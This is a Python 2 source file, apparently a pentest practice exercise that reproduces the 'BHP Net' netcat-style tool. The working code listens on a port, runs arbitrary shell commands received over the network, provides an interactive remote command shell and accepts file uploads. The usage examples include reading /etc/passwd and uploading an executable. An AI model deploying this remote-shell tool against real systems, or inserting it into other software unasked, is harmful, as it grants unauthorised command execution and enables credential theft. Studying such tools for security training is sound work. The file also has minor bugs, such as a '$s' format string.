# -*- coding: utf-8 -*-


''' Execice Python for pentest / bhpnet program '''


import sys
import socket
import getopt
import threading
import subprocess


listen = False
command = False
upload = False
execute = ''
target = ''
upload_destination = ''
port = 0


def usage():
    ''' BPHNET Usage - command options screen '''

    print 'BHP Net Tool'
    print ''
    print ''
    print 'Usage: bhpnet.py -t target_host -p port'
    print ''
    print '-l --listen                  - listen on [host]:[port] for incoming connections'
    print '-e --execute=file_to_run     - execute the given file upon receiving a connection'
    print '-c --command                 - initialize command shell'
    print '-u --upload=destination      - upon receiving connection upload a file and write to [destination]'
    print ''
    print ''
    print 'Examples:'
    print ''
    print 'bhpnet.py -t 192.168.0.1 -p 5555 -l -c'
    print 'bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c://target.exe'
    print 'bhpnet.py -t 192.168.0.1 -p 5555 -l -e="cat /etc/passwd"'
    print 'echo "ABCDEFGHIJ" | ./bhpnet.py -t 102.168.11.12 -p 135'
    print ''

    sys.exit(0)


def client_sender(buffer):
    ''' client data sender'''
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # connect into host target
        client.connect((target, port))

        if len(buffer):
            client.send(buffer)

        while True:
            recv_len = 1
            response = ''

            while recv_len:
                    data = client.recv(4096)
                    
                    recv_len = len(data)
                    response += data

                    if recv_len < 4096:
                        break
            
            print ''
            print response
            print ''
    
            buffer = raw_input('')
            buffer += '\n'
            
            client.send(buffer)


    except:
        print '[*] Exception! Exiting'

        client.close()


def client_handler(client_socket):
    ''' client handler method'''

    global upload
    global execute
    global command

    # verify it is upload
    if len(upload_destination):
        
        # read all bytes and save in out destine
        file_buffer = ''

        # stay reading the data until there arent some enable data
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # try save the bytes
        try:
            file_decriptor = open(upload_destination, 'wb')

            file_decriptor.write(file_buffer)
            file_decriptor.close()
             
            to_send = 'Successfully saved file to $s\r\n' % upload_destination
        except:
            to_send = 'Failed to save file to %s\r\n' % upload_destination

        client_socket.send(to_send)
        
        # verify if it is command execution
    if len(execute):
        # execute command
        output = run_command(execute)

        client_socket.send(output)

    # enter in another loop if a command shell whent requested
    if command:
        while True:
            #show a simple prompt
            client_socket.send('<BHP:#> ')

            #now we are data receiving until a linefeed (enter keyboard)
            cmd_buffer = ''
            
            while '\n' not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            
            # send become command output
            response = run_command(cmd_buffer)
            
            # send become response
            client_socket.send(response)


def server_loop():
    ''' server looping '''

    global target

    if not len(target):
        target = '127.0.0.1'
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        print '\n\r[*] connection accept'
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        
        print '\n\r[*] Initializing thread'
        client_thread.start()


def run_command(command):
    ''' run shell command'''

    # remove break line
    command = command.rstrip()

    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)    
    except:
        output = 'Failed to execute command.\r\n'
    
    return output


def main():
    ''' starter method '''

    global listen
    global command
    global upload
    global execute
    global target
    global upload_destination
    global port
    
    # input params validation
    if not len(sys.argv[1:]):
        usage()
    
    # read line command options
    try:
        optlist = ['help', 'listen', 'execute', 'target', 'port', 'command', 'upload']
        opts, args = getopt.getopt(sys.argv[1:], 'hle:t:p:cu:', optlist)

        #import pudb; pu.db

    except getopt.GetoptError as err:
        print str(err)
        print ''   
        usage()

    for o,a in opts:
        if o in ('-h', '--help'):
            usage()
        elif o in ('-l', '--listen'):
            listen = True
        elif o in ('-e', '--execute'):
            execute = a
        elif o in ('-c', '--commandshell'):
            command = True
        elif o in ('-u', '--upload'):
            upload_destination = a
        elif o in ('-t', '--target'):
            target = a
        elif o in ('-p', '--port'):
            port = int(a)
        else:
            assert False, 'Unhandled Option'

    # Will we listen ir just send some data of stdin?
    if not listen and len(target) and port > 0:
        # read line command buffer
        # will be block, use ctrl + d
        # if no more send data
        buffer = sys.stdin.read()
        
        print '\n\r[*] Finally buffer'

        # send data off
        client_sender(buffer)

    if listen:
        server_loop()


# EXEUTE main FUNCTION
main()
